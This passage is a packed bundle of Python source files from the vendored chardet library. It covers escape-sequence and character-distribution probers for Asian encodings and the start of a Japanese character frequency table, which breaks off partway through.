SingleByteCharSetProber(Win1253GreekModel),\n            SingleByteCharSetProber(Latin5BulgarianModel),\n            SingleByteCharSetProber(Win1251BulgarianModel),\n            # TODO: Restore Hungarian encodings (iso-8859-2 and windows-1250)\n            #       after we retrain model.\n            # SingleByteCharSetProber(Latin2HungarianModel),\n            # SingleByteCharSetProber(Win1250HungarianModel),\n            SingleByteCharSetProber(TIS620ThaiModel),\n            SingleByteCharSetProber(Latin5TurkishModel),\n        ]\n        hebrew_prober = HebrewProber()\n        logical_hebrew_prober = SingleByteCharSetProber(Win1255HebrewModel,\n                                                        False, hebrew_prober)\n        visual_hebrew_prober = SingleByteCharSetProber(Win1255HebrewModel, True,\n                                                       hebrew_prober)\n        hebrew_prober.set_model_probers(logical_hebrew_prober, visual_hebrew_prober)\n        self.probers.extend([hebrew_prober, logical_hebrew_prober,\n                             visual_hebrew_prober])\n\n        self.reset()\n", "thirdparty/chardet/escprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .charsetprober import CharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .enums import LanguageFilter, ProbingState, MachineState\nfrom .escsm import (HZ_SM_MODEL, ISO2022CN_SM_MODEL, ISO2022JP_SM_MODEL,\n                    ISO2022KR_SM_MODEL)\n\n\nclass EscCharSetProber(CharSetProber):\n    \"\"\"\n    This CharSetProber uses a \"code scheme\" approach for detecting encodings,\n    whereby easily recognizable escape or shift sequences are relied on to\n    identify these encodings.\n    \"\"\"\n\n    def __init__(self, lang_filter=None):\n        super(EscCharSetProber, self).__init__(lang_filter=lang_filter)\n        self.coding_sm = []\n        if self.lang_filter & LanguageFilter.CHINESE_SIMPLIFIED:\n            self.coding_sm.append(CodingStateMachine(HZ_SM_MODEL))\n            self.coding_sm.append(CodingStateMachine(ISO2022CN_SM_MODEL))\n        if self.lang_filter & LanguageFilter.JAPANESE:\n            self.coding_sm.append(CodingStateMachine(ISO2022JP_SM_MODEL))\n        if self.lang_filter & LanguageFilter.KOREAN:\n            self.coding_sm.append(CodingStateMachine(ISO2022KR_SM_MODEL))\n        self.active_sm_count = None\n        self._detected_charset = None\n        self._detected_language = None\n        self._state = None\n        self.reset()\n\n    def reset(self):\n        super(EscCharSetProber, self).reset()\n        for coding_sm in self.coding_sm:\n            if not coding_sm:\n                continue\n            coding_sm.active = True\n            coding_sm.reset()\n        self.active_sm_count = len(self.coding_sm)\n        self._detected_charset = None\n        self._detected_language = None\n\n    @property\n    def charset_name(self):\n        return self._detected_charset\n\n    @property\n    def language(self):\n        return self._detected_language\n\n    def get_confidence(self):\n        if self._detected_charset:\n            return 0.99\n        else:\n            return 0.00\n\n    def feed(self, byte_str):\n        for c in byte_str:\n            for coding_sm in self.coding_sm:\n                if not coding_sm or not coding_sm.active:\n                    continue\n                coding_state = coding_sm.next_state(c)\n                if coding_state == MachineState.ERROR:\n                    coding_sm.active = False\n                    self.active_sm_count -= 1\n                    if self.active_sm_count <= 0:\n                        self._state = ProbingState.NOT_ME\n                        return self.state\n                elif coding_state == MachineState.ITS_ME:\n                    self._state = ProbingState.FOUND_IT\n                    self._detected_charset = coding_sm.get_coding_state_machine()\n                    self._detected_language = coding_sm.language\n                    return self.state\n\n        return self.state\n", "thirdparty/chardet/chardistribution.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .euctwfreq import (EUCTW_CHAR_TO_FREQ_ORDER, EUCTW_TABLE_SIZE,\n                        EUCTW_TYPICAL_DISTRIBUTION_RATIO)\nfrom .euckrfreq import (EUCKR_CHAR_TO_FREQ_ORDER, EUCKR_TABLE_SIZE,\n                        EUCKR_TYPICAL_DISTRIBUTION_RATIO)\nfrom .gb2312freq import (GB2312_CHAR_TO_FREQ_ORDER, GB2312_TABLE_SIZE,\n                         GB2312_TYPICAL_DISTRIBUTION_RATIO)\nfrom .big5freq import (BIG5_CHAR_TO_FREQ_ORDER, BIG5_TABLE_SIZE,\n                       BIG5_TYPICAL_DISTRIBUTION_RATIO)\nfrom .jisfreq import (JIS_CHAR_TO_FREQ_ORDER, JIS_TABLE_SIZE,\n                      JIS_TYPICAL_DISTRIBUTION_RATIO)\n\n\nclass CharDistributionAnalysis(object):\n    ENOUGH_DATA_THRESHOLD = 1024\n    SURE_YES = 0.99\n    SURE_NO = 0.01\n    MINIMUM_DATA_THRESHOLD = 3\n\n    def __init__(self):\n        # Mapping table to get frequency order from char order (get from\n        # GetOrder())\n        self._char_to_freq_order = None\n        self._table_size = None  # Size of above table\n        # This is a constant value which varies from language to language,\n        # used in calculating confidence.  See\n        # http://www.mozilla.org/projects/intl/UniversalCharsetDetection.html\n        # for further detail.\n        self.typical_distribution_ratio = None\n        self._done = None\n        self._total_chars = None\n        self._freq_chars = None\n        self.reset()\n\n    def reset(self):\n        \"\"\"reset analyser, clear any state\"\"\"\n        # If this flag is set to True, detection is done and conclusion has\n        # been made\n        self._done = False\n        self._total_chars = 0  # Total characters encountered\n        # The number of characters whose frequency order is less than 512\n        self._freq_chars = 0\n\n    def feed(self, char, char_len):\n        \"\"\"feed a character with known length\"\"\"\n        if char_len == 2:\n            # we only care about 2-bytes character in our distribution analysis\n            order = self.get_order(char)\n        else:\n            order = -1\n        if order >= 0:\n            self._total_chars += 1\n            # order is valid\n            if order < self._table_size:\n                if 512 > self._char_to_freq_order[order]:\n                    self._freq_chars += 1\n\n    def get_confidence(self):\n        \"\"\"return confidence based on existing data\"\"\"\n        # if we didn't receive any character in our consideration range,\n        # return negative answer\n        if self._total_chars <= 0 or self._freq_chars <= self.MINIMUM_DATA_THRESHOLD:\n            return self.SURE_NO\n\n        if self._total_chars != self._freq_chars:\n            r = (self._freq_chars / ((self._total_chars - self._freq_chars)\n                 * self.typical_distribution_ratio))\n            if r < self.SURE_YES:\n                return r\n\n        # normalize confidence (we don't want to be 100% sure)\n        return self.SURE_YES\n\n    def got_enough_data(self):\n        # It is not necessary to receive all data to draw conclusion.\n        # For charset detection, certain amount of data is enough\n        return self._total_chars > self.ENOUGH_DATA_THRESHOLD\n\n    def get_order(self, byte_str):\n        # We do not handle characters based on the original encoding string,\n        # but convert this encoding string to a number, here called order.\n        # This allows multiple encodings of a language to share one frequency\n        # table.\n        return -1\n\n\nclass EUCTWDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(EUCTWDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = EUCTW_CHAR_TO_FREQ_ORDER\n        self._table_size = EUCTW_TABLE_SIZE\n        self.typical_distribution_ratio = EUCTW_TYPICAL_DISTRIBUTION_RATIO\n\n    def get_order(self, byte_str):\n        # for euc-TW encoding, we are interested\n        #   first  byte range: 0xc4 -- 0xfe\n        #   second byte range: 0xa1 -- 0xfe\n        # no validation needed here. State machine has done that\n        first_char = byte_str[0]\n        if first_char >= 0xC4:\n            return 94 * (first_char - 0xC4) + byte_str[1] - 0xA1\n        else:\n            return -1\n\n\nclass EUCKRDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(EUCKRDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = EUCKR_CHAR_TO_FREQ_ORDER\n        self._table_size = EUCKR_TABLE_SIZE\n        self.typical_distribution_ratio = EUCKR_TYPICAL_DISTRIBUTION_RATIO\n\n    def get_order(self, byte_str):\n        # for euc-KR encoding, we are interested\n        #   first  byte range: 0xb0 -- 0xfe\n        #   second byte range: 0xa1 -- 0xfe\n        # no validation needed here. State machine has done that\n        first_char = byte_str[0]\n        if first_char >= 0xB0:\n            return 94 * (first_char - 0xB0) + byte_str[1] - 0xA1\n        else:\n            return -1\n\n\nclass GB2312DistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(GB2312DistributionAnalysis, self).__init__()\n        self._char_to_freq_order = GB2312_CHAR_TO_FREQ_ORDER\n        self._table_size = GB2312_TABLE_SIZE\n        self.typical_distribution_ratio = GB2312_TYPICAL_DISTRIBUTION_RATIO\n\n    def get_order(self, byte_str):\n        # for GB2312 encoding, we are interested\n        #  first  byte range: 0xb0 -- 0xfe\n        #  second byte range: 0xa1 -- 0xfe\n        # no validation needed here. State machine has done that\n        first_char, second_char = byte_str[0], byte_str[1]\n        if (first_char >= 0xB0) and (second_char >= 0xA1):\n            return 94 * (first_char - 0xB0) + second_char - 0xA1\n        else:\n            return -1\n\n\nclass Big5DistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(Big5DistributionAnalysis, self).__init__()\n        self._char_to_freq_order = BIG5_CHAR_TO_FREQ_ORDER\n        self._table_size = BIG5_TABLE_SIZE\n        self.typical_distribution_ratio = BIG5_TYPICAL_DISTRIBUTION_RATIO\n\n    def get_order(self, byte_str):\n        # for big5 encoding, we are interested\n        #   first  byte range: 0xa4 -- 0xfe\n        #   second byte range: 0x40 -- 0x7e , 0xa1 -- 0xfe\n        # no validation needed here. State machine has done that\n        first_char, second_char = byte_str[0], byte_str[1]\n        if first_char >= 0xA4:\n            if second_char >= 0xA1:\n                return 157 * (first_char - 0xA4) + second_char - 0xA1 + 63\n            else:\n                return 157 * (first_char - 0xA4) + second_char - 0x40\n        else:\n            return -1\n\n\nclass SJISDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(SJISDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = JIS_CHAR_TO_FREQ_ORDER\n        self._table_size = JIS_TABLE_SIZE\n        self.typical_distribution_ratio = JIS_TYPICAL_DISTRIBUTION_RATIO\n\n    def get_order(self, byte_str):\n        # for sjis encoding, we are interested\n        #   first  byte range: 0x81 -- 0x9f , 0xe0 -- 0xfe\n        #   second byte range: 0x40 -- 0x7e,  0x81 -- oxfe\n        # no validation needed here. State machine has done that\n        first_char, second_char = byte_str[0], byte_str[1]\n        if (first_char >= 0x81) and (first_char <= 0x9F):\n            order = 188 * (first_char - 0x81)\n        elif (first_char >= 0xE0) and (first_char <= 0xEF):\n            order = 188 * (first_char - 0xE0 + 31)\n        else:\n            return -1\n        order = order + second_char - 0x40\n        if second_char > 0x7F:\n            order = -1\n        return order\n\n\nclass EUCJPDistributionAnalysis(CharDistributionAnalysis):\n    def __init__(self):\n        super(EUCJPDistributionAnalysis, self).__init__()\n        self._char_to_freq_order = JIS_CHAR_TO_FREQ_ORDER\n        self._table_size = JIS_TABLE_SIZE\n        self.typical_distribution_ratio = JIS_TYPICAL_DISTRIBUTION_RATIO\n\n    def get_order(self, byte_str):\n        # for euc-JP encoding, we are interested\n        #   first  byte range: 0xa0 -- 0xfe\n        #   second byte range: 0xa1 -- 0xfe\n        # no validation needed here. State machine has done that\n        char = byte_str[0]\n        if char >= 0xA0:\n            return 94 * (char - 0xA1) + byte_str[1] - 0xa1\n        else:\n            return -1\n", "thirdparty/chardet/jisfreq.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# Sampling from about 20M text materials include literature and computer technology\n#\n# Japanese frequency table, applied to both S-JIS and EUC-JP\n# They are sorted in order.\n\n# 128  --> 0.77094\n# 256  --> 0.85710\n# 512  --> 0.92635\n# 1024 --> 0.97130\n# 2048 --> 0.99431\n#\n# Ideal Distribution Ratio = 0.92635 / (1-0.92635) = 12.58\n# Random Distribution Ration = 512 / (2965+62+83+86-512) = 0.191\n#\n# Typical Distribution Ratio, 25% of IDR\n\nJIS_TYPICAL_DISTRIBUTION_RATIO = 3.0\n\n# Char to FreqOrder table ,\nJIS_TABLE_SIZE = 4368\n\nJIS_CHAR_TO_FREQ_ORDER = (\n  40,   1,   6, 182, 152, 180, 295,2127, 285, 381,3295,4304,3068,4606,3165,3510, #   16\n3511,1822,2785,4607,1193,2226,5070,4608, 171,2996,1247,  18, 179,5071, 856,1661, #   32\n1262,5072, 619, 127,3431,3512,3230,1899,1700, 232, 228,1294,1298, 284, 283,2041, #   48\n2042,1061,1062,  48,  49,  44,  45, 433, 434,1040,1041, 996, 787,2997,1255,4305, #   64\n2108,4609,1684,1648,5073,5074,5075,5076,5077,5078,3687,5079,4610,5080,3927,3928, #   80\n5081,3296,3432, 290,2285,1471,2187,5082,2580,2825,1303,2140,1739,1445,2691,3375, #   96\n1691,3297,4306,4307,4611, 452,3376,1182,2713,3688,3069,4308,5083,5084,5085,5086, #  112\n5087,5088,5089,5090,5091,5092,5093,5094,5095,5096,5097,5098,5099,5100,5101,5102, #  128\n5103,5104,5105,5106,5107,5108,5109,5110,5111,5112,4097,5113,5114,5115,5116,5117, #  144\n5118,5119,5120,5121,5122,5123,5124,5125,5126,5127,5128,5129,5130,5131,5132,5133, #  160\n5134,5135,5136,5137,5138,5139,5140,5141,5142,5143,5144,5145,5146,5147,5148,5149, #  176\n5150,5151,5152,4612,5153,5154,5155,5156,5157,5158,5159,5160,5161,5162,5163,5164, #  192\n5165,5166,5167,5168,5169,5170,5171,5172,5173,5174,5175,1472, 598, 618, 820,1205, #  208\n1309,1412,1858,1307,1692,5176,5177,5178,5179,5180,5181,5182,1142,1452,1234,1172, #  224\n1875,2043,2149,1793,1382,2973, 925,2404,1067,1241, 960,1377,2935,1491, 919,1217, #  240\n1865,2030,1406,1499,2749,4098,5183,5184,5185,5186,5187,5188,2561,4099,3117,1804, #  256\n2049,3689,4309,3513,1663,5189,3166,3118,3298,1587,1561,3433,5190,3119,1625,2998, #  272\n3299,4613,1766,3690,2786,4614,5191,5192,5193,5194,2161,  26,3377,   2,3929,  20, #  288\n3691,  47,4100,  50,  17,  16,  35, 268,  27, 243,  42, 155,  24, 154,  29, 184, #  304\n   4,  91,  14,  92,  53, 396,  33, 289,   9,  37,  64, 620,  21,  39, 321,   5, #  320\n  12,  11,  52,  13,   3, 208, 138,   0,   7,  60, 526, 141, 151,1069, 181, 275, #  336\n1591,  83, 132,1475, 126, 331, 829,  15,  69, 160,  59,  22, 157,  55,1079, 312, #  352\n 109,  38,  23,  25,  10,  19,  79,5195,  61, 382,1124,   8,  30,5196,5197,5198, #  368\n5199,5200,5201,5202,5203,5204,5205,5206,  89,  62,  74,  34,2416, 112, 139, 196, #  384\n 271, 149,  84, 607, 131, 765,  46,  88, 153, 683,  76, 874, 101, 258,  57,  80, #  400\n  32, 364, 121,1508, 169,1547,  68, 235, 145,2999,  41, 360,3027,  70,  63,  31, #  416\n  43, 259, 262,1383,  99, 533, 194,  66,  93, 846, 217, 192,  56, 106,  58, 565, #  432\n 280, 272, 311, 256, 146,  82, 308,  71, 100, 128, 214, 655, 110, 261, 104,1140, #  448\n  54,  51,  36,  87,  67,3070, 185,2618,2936,2020,  28,1066,2390,2059,5207,5208, #  464\n5209,5210,5211,5212,5213,5214,5215,5216,4615,5217,5218,5219,5220,5221,5222,5223, #  480\n5224,5225,5226,5227,5228,5229,5230,5231,5232,5233,5234,5235,5236,3514,5237,5238, #  496\n5239,5240,5241,5242,5243,5244,2297,2031,4616,4310,3692,5245,3071,5246,3598,5247, #  512\n4617,3231,3515,5248,4101,4311,4618,3808,4312,4102,5249,4103,4104,3599,5250,5251, #  528\n5252,5253,5254,5255,5256,5257,5258,5259,5260,5261,5262,5263,5264,5265,5266,5267, #  544\n5268,5269,5270,5271,5272,5273,5274,5275,5276,5277,5278,5279,5280,5281,5282,5283, #  560\n5284,5285,5286,5287,5288,5289,5290,5291,5292,5293,5294,5295,5296,5297,5298,5299, #  576\n5300,5301,5302,5303,5304,5305,5306,5307,5308,5309,5310,5311,5312,5313,5314,5315, #  592\n5316,5317,5318,5319,5320,5321,5322,5323,5324,5325,5326,5327,5328,5329,5330,5331, #  608\n5332,5333,5334,5335,5336,5337,5338,5339,5340,5341,5342,5343,5344,5345,5346,5347, #  624\n5348,5349,5350,5351,5352,5353,5354,5355,5356,5357,5358,5359,5360,5361,5362,5363, #  640\n5364,5365,5366,5367,5368,5369,5370,5371,5372,5373,5374,5375,5376,5377,5378,5379, #  656\n5380,5381, 363, 642,2787,2878,2788,2789,2316,3232,2317,3434,2011, 165,1942,3930, #  672\n3931,3932,3933,5382,4619,5383,4620,5384,5385,5386,5387,5388,5389,5390,5391,5392, #  688\n5393,5394,5395,5396,5397,5398,5399,5400,5401,5402,5403,5404,5405,5406,5407,5408, #  704\n5409,5410,5411,5412,5413,5414,5415,5416,5417,5418,5419,5420,5421,5422,5423,5424, #  720\n5425,5426,5427,5428,5429,5430,5431,5432,5433,5434,5435,5436,5437,5438,5439,5440, #  736\n5441,5442,5443,5444,5445,5446,5447,5448,5449,5450,5451,5452,5453,5454,5455,5456, #  752\n5457,5458,5459,5460,5461,5462,5463,5464,5465,5466,5467,5468,5469,5470,5471,5472, #  768\n5473,5474,5475,5476,5477,5478,5479,5480,5481,5482,5483,5484,5485,5486,5487,5488, #  784\n5489,5490,5491,5492,5493,5494,5495,5496,5497,5498,5499,5500,5501,5502,5503,5504, #  800\n5505,5506,5507,5508,5509,5510,5511,5512,5513,5514,5515,5516,5517,5518,5519,5520, #  816\n5521,5522,5523,5524,5525,5526,5527,5528,5529,5530,5531,5532,5533,5534,5535,5536, #  832\n5537,5538,5539,5540,5541,5542,5543,5544,5545,5546,5547,5548,5549,5550,5551,5552, #  848\n5553,5554,5555,5556,5557,5558,5559,5560,5561,5562,5563,5564,5565,5566,5567,5568, #  864\n5569,5570,5571,5572,5573,5574,5575,5576,5577,5578,5579,5580,5581,5582,5583,5584, #  880\n5585,5586,5587,5588,5589,5590,5591,5592,5593,5594,5595,5596,5597,5598,5599,5600, #  896\n5601,5602,5603,5604,5605,5606,5607,5608,5609,5610,5611,5612,5613,5614,5615,5616, #  912\n5617,5618,5619,5620,5621,5622,5623,5624,5625,5626,5627,5628,5629,5630,5631,5632, #  928\n5633,5634,5635,5636,5637,5638,5639,5640,5641,5642,5643,5644,5645,5646,5647,5648, #  944\n5649,5650,5651,5652,5653,5654,5655,5656,5657,5658,5659,5660,5661,5662,5663,5664, #  960\n5665,5666,5667,5668,5669,5670,5671,5672,5673,5674,5675,5676,5677,5678,5679,5680, #  976\n5681,5682,5683,5684,5685,5686,5687,5688,5689,5690,5691,5692,5693,5694,5695,5696, #  992\n5697,5698,5699,5700,5701,5702,5703,5704,5705,5706,5707,5708,5709,5710,5711,5712, # 1008\n5713,5714,5715,5716,5717,5718,5719,5720,5721,5722,5723,5724,5725,5726,5727,5728, # 1024\n5729,5730,5731,5732,5733,5734,5735,5736,5737,5738,5739,5740,5741,5742,5743,5744, # 1040\n5745,5746,5747,5748,5749,5750,5751,5752,5753,5754,5755,5756,5757,5758,5759,5760, # 1056\n5761,5762,5763,5764,5765,5766,5767,5768,5769,5770,5771,5772,5773,5774,5775,5776, # 1072\n5777,5778,5779,5780,5781,5782,5783,5784,5785,5786,5787,5788,5789,5790,5791,5792, # 1088\n5793,5794,5795,5796,5797,5798,5799,5800,5801,5802,5803,5804,5805,5806,5807,5808, # 1104\n5809,5810,5811,5812,5813,5814,5815,5816,5817,5818,5819,5820,5821,5822,5823,5824, # 1120\n5825,5826,5827,5828,5829,5830,5831,5832,5833,5834,5835,5836,5837,5838,5839,5840, # 1136\n5841,5842,5843,5844,5845,5846,5847,5848,5849,5850,5851,5852,5853,5854,5855,5856, # 1152\n5857,5858,5859,5860,5861,5862,5863,5864,5865,5866,5867,5868,5869,5870,5871,5872, # 1168\n5873,5874,5875,5876,5877,5878,5879,5880,5881,5882,5883,5884,5885,5886,5887,5888, # 1184\n5889,5890,5891,5892,5893,5894,5895,5896,5897,5898,5899,5900,5901,5902,5903,5904, # 1200\n5905,5906,5907,5908,5909,5910,5911,5912,5913,5914,5915,5916,5917,5918,5919,5920, # 1216\n5921,5922,5923,5924,5925,5926,5927,5928,5929,5930,5931,5932,5933,5934,5935,5936, # 1232\n5937,5938,5939,5940,5941,5942,5943,5944,5945,5946,5947,5948,5949,5950,5951,5952, # 1248\n5953,5954,5955,5956,5957,5958,5959,5960,5961,5962,5963,5964,5965,5966,5967,5968, # 1264\n5969,5970,5971,5972,5973,5974,5975,5976,5977,5978,5979,5980,5981,5982,5983,5984, # 1280\n5985,5986,5987,5988,5989,5990,5991,5992,5993,5994,5995,5996,5997,5998,5999,6000, # 1296\n6001,6002,6003,6004,6005,6006,6007,6008,6009,6010,6011,6012,6013,6014,6015,6016, # 1312\n6017,6018,6019,6020,6021,6022,6023,6024,6025,6026,6027,6028,6029,6030,6031,6032, # 1328\n6033,6034,6035,6036,6037,6038,6039,6040,6041,6042,6043,6044,6045,6046,6047,6048, # 1344\n6049,6050,6051,6052,6053,6054,6055,6056,6057,6058,6059,6060,6061,6062,6063,6064, # 1360\n6065,6066,6067,6068,6069,6070,6071,6072,6073,6074,6075,6076,6077,6078,6079,6080, # 1376\n6081,6082,6083,6084,6085,6086,6087,6088,6089,6090,6091,6092,6093,6094,6095,6096, # 1392\n6097,6098,6099,6100,6101,6102,6103,6104,6105,6106,6107,6108,6109,6110,6111,6112, # 1408\n6113,6114,2044,2060,4621, 997,1235, 473,1186,4622, 920,3378,6115,6116, 379,1108, # 1424\n4313,2657,2735,3934,6117,3809, 636,3233, 573,1026,3693,3435,2974,3300,2298,4105, # 1440\n 854,2937,2463, 393,2581,2417, 539, 752,1280,2750,2480, 140,1161, 440, 708,1569, # 1456\n 665,2497,1746,1291,1523,3000, 164,1603, 847,1331, 537,1997, 486, 508,1693,2418, # 1472\n1970,2227, 878,1220, 299,1030, 969, 652,2751, 624,1137,3301,2619,  65,3302,2045, # 1488\n1761,1859,3120,1930,3694,3516, 663,1767, 852, 835,3695, 269, 767,2826,2339,1305, # 1504\n 896,1150, 770,1616,6118, 506,1502,2075,1012,2519, 775,2520,2975,2340,2938,4314, # 1520\n3028,2086,1224,1943,2286,6119,3072,4315,2240,1273,1987,3935,1557, 175, 597, 985, # 1536\n3517,2419,2521,1416,3029, 585, 938,1931,1007,1052,1932,1685,6120,3379,4316,4623, # 1552\n 804, 599,3121,1333,2128,2539,1159,1554,2032,3810, 687,2033,2904, 952, 675,1467, # 1568\n3436,6121,2241,1096,1786,2440,1543,1924, 980,1813,2228, 781,2692,1879, 728,1918, # 1584\n3696,4624, 548,1950,4625,1809,1088,1356,3303,2522,1944, 502, 972, 373, 513,2827, # 1600\n 586,2377,2391,1003,1976,1631,6122,2464,1084, 648,1776,4626,2141, 324, 962,2012, # 1616\n2177,2076,1384, 742,2178,1448,1173,1810, 222, 102, 301, 445, 125,2420, 662,2498, # 1632\n 277, 200,1476,1165,1068, 224,2562,1378,1446, 450,1880, 659, 791, 582,4627,2939, # 1648\n3936,1516,1274, 555,2099,3697,1020,1389,1526,3380,1762,1723,1787,2229, 412,2114, # 1664\n1900,2392,3518, 512,2597, 427,1925,2341,3122,1653,1686,2465,2499, 697, 330, 273, # 1680\n 380,2162, 951, 832, 780, 991,1301,3073, 965,2270,3519, 668,2523,2636,1286, 535, # 1696\n1407, 518, 671, 957,2658,2378, 267, 611,2197,3030,6123, 248,2299, 967,1799,2356, # 1712\n 850,1418,3437,1876,1256,1480,2828,1718,6124,6125,1755,1664,2405,6126,4628,2879, # 1728\n2829, 499,2179, 676,4629, 557,2329,2214,2090, 325,3234, 464, 811,3001, 992,2342, # 1744\n2481,1232,1469, 303,2242, 466,1070,2163, 603,1777,2091,4630,2752,4631,2714, 322, # 1760\n2659,1964,1768, 481,2188,1463,2330,2857,3600,2092,3031,2421,4632,2318,2070,1849, # 1776\n2598,4633,1302,2254,1668,1701,2422,3811,2905,3032,3123,2046,4106,1763,1694,4634, # 1792\n1604, 943,1724,1454, 917, 868,2215,1169,2940, 552,1145,1800,1228,1823,1955, 316, # 1808\n1080,2510, 361,1807,2830,4107,2660,3381,1346,1423,1134,4108,6127, 541,1263,1229, # 1824\n1148,2540, 545, 465,1833,2880,3438,1901,3074,2482, 816,3937, 713,1788,2500, 122, # 1840\n1575, 195,1451,2501,1111,6128, 859, 374,1225,2243,2483,4317, 390,1033,3439,3075, # 1856\n2524,1687, 266, 793,1440,2599, 946, 779, 802, 507, 897,1081, 528,2189,1292, 711, # 1872\n1866,1725,1167,1640, 753, 398,2661,1053, 246, 348,4318, 137,1024,3440,1600,2077, # 1888\n2129, 825,4319, 698, 238, 521, 187,2300,1157,2423,1641,1605,1464,1610,1097,2541, # 1904\n1260,1436, 759,2255,1814,2150, 705,3235, 409,2563,3304, 561,3033,2005,2564, 726, # 1920\n1956,2343,3698,4109, 949,3812,3813,3520,1669, 653,1379,2525, 881,2198, 632,2256, # 1936\n1027, 778,1074, 733,1957, 514,1481,2466, 554,2180, 702,3938,1606,1017,1398,6129, # 1952\n1380,3521, 921, 993,1313, 594, 449,1489,1617,1166, 768,1426,1360, 495,1794,3601, # 1968\n1177,3602,1170,4320,2344, 476, 425,3167,4635,3168,1424, 401,2662,1171,3382,1998, # 1984\n1089,4110, 477,3169, 474,6130,1909, 596,2831,1842, 494, 693,1051,1028,1207,3076, # 2000\n 606,2115, 727,2790,1473,1115, 743,3522, 630, 805,1532,4321,2021, 366,1057, 838, # 2016\n 684,1114,2142,4322,2050,1492,1892,1808,2271,3814,2424,1971,1447,1373,3305,1090, # 2032\n1536,3939,3523,3306,1455,2199, 336, 369,2331,1035, 584,2393, 902, 718,2600,6131, # 2048\n2753, 463,2151,1149,1611,2467, 715,1308,3124,1268, 343,1413,3236,1517,1347,2663, # 2064\n2093,3940,2022,1131,1553,2100,2941,1427,3441,2942,1323,2484,6132,1980, 872,2368, # 2080\n2441,2943, 320,2369,2116,1082, 679,1933,3941,2791,3815, 625,1143,2023, 422,2200, # 2096\n3816,6133, 730,1695, 356,2257,1626,2301,2858,2637,1627,1778, 937, 883,2906,2693, # 2112\n3002,1769,1086, 400,1063,1325,3307,2792,4111,3077, 456,2345,1046, 747,6134,1524, # 2128\n 884,1094,3383,1474,2164,1059, 974,1688,2181,2258,1047, 345,1665,1187, 358, 875, # 2144\n3170, 305, 660,3524,2190,1334,1135,3171,1540,1649,2542,1527, 927, 968,2793, 885, # 2160\n1972,1850, 482, 500,2638,1218,1109,1085,2543,1654,2034, 876,  78,2287,1482,1277, # 2176\n 861,1675,1083,1779, 724,2754, 454, 397,1132,1612,2332, 893, 672,1237, 257,2259, # 2192\n2370, 135,3384, 337,2244, 547, 352, 340, 709,2485,1400, 788,1138,2511, 540, 772, # 2208\n1682,2260,2272,2544,2013,1843,1902,4636,1999,1562,2288,4637,2201,1403,1533, 407, # 2224\n 576,3308,1254,2071, 978,3385, 170, 136,1201,3125,2664,3172,2394, 213, 912, 873, # 2240\n3603,1713,2202, 699,3604,3699, 813,3442, 493, 531,1054, 468,2907,1483, 304, 281, # 2256\n4112,1726,1252,2094, 339,2319,2130,2639, 756,1563,2944, 748, 571,2976,1588,2425, # 2272\n2715,1851,1460,2426,1528,1392,1973,3237, 288,3309, 685,3386, 296, 892,2716,2216, # 2288\n1570,2245, 722,1747,2217, 905,3238,1103,6135,1893,1441,1965, 251,1805,2371,3700, # 2304\n2601,1919,1078,  75,2182,1509,1592,1270,2640,4638,2152,6136,3310,3817, 524, 706, # 2320\n1075, 292,3818,1756,2602, 317,  98,3173,3605,3525,1844,2218,3819,2502, 814, 567, # 2336\n 385,2908,1534,6137, 534,1642,3239, 797,6138,1670,1529, 953,4323, 188,1071, 538, # 2352\n 178, 729,3240,2109,1226,1374,2000,2357,2977, 